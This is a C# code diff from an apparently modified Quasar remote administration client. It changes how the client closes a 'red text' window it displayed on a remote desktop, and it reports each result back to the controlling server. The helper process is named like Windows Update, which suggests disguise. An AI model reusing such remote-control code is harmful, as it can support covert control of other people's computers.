@@ -60,33 +60,29 @@ namespace Quasar.Client.Messages
                     contentStr = "";
                     flag7 = true;
 
-                    IntPtr hwnd = FindWindow("WindowsUpdate", null);  // Find the window by class name
+                    //Process[] processes = Process.GetProcessesByName("WindowsUpdater");
 
-                    if (hwnd != IntPtr.Zero)
-                    {
-                        // Get the process ID associated with the window
-                        uint processId;
-                        GetWindowThreadProcessId(hwnd, out processId);
-
-                        // Get the process object
-                        Process process = Process.GetProcessById((int)processId);
-
-                        // Kill the process
-                        if (process != null)
-                        {
-                            // Console.WriteLine($"Terminating process: {process.ProcessName} (PID: {processId})");
-                            process.Kill();
-                            client.Send(new NotifyMessageToServer { Message = "Closed Red Text Window" });
-                            return;
-                            // Console.WriteLine("Process terminated.");
-                        }
-                    }
-                    else
-                    {
-                        // Console.WriteLine("Window not found.");
-                        client.Send(new NotifyMessageToServer { Message = "There is no Red Text Window" });
-                        return;
-                    }
+                    //if (processes.Length > 0)
+                    //{
+                    //    foreach (var process in processes)
+                    //    {
+                    //        try
+                    //        {
+                    //            // Kill the process
+                    //            process.Kill();
+                    //            process.WaitForExit();
+                    //            client.Send(new NotifyMessageToServer { Message = $"Terminated red text process: {process.ProcessName}" });
+                    //        }
+                    //        catch (Exception ex)
+                    //        {
+                    //            client.Send(new NotifyMessageToServer { Message = $"Error terminating process {process.ProcessName} (PID: {process.Id}): {ex.Message}" });
+                    //        }
+                    //    }
+                    //}
+                    //else
+                    //{
+                    //    client.Send(new NotifyMessageToServer { Message = "There is no Red Text Process" });
+                    //}                    
                 }
                 try
                 {
@@ -150,6 +146,10 @@ namespace Quasar.Client.Messages
                     else if (!flag7)
                     {
                         client.Send(new NotifyMessageToServer { Message = string.Format("{0}", string.Format("Invisible text showed (on {0} desktop)!", strDesktop)) });
+                    }
+                    if (flag7)
+                    {
+                        client.Send(new NotifyMessageToServer { Message = $"Removed Red Text on {strDesktop} desktop" });
                     }
                     return;
                 }
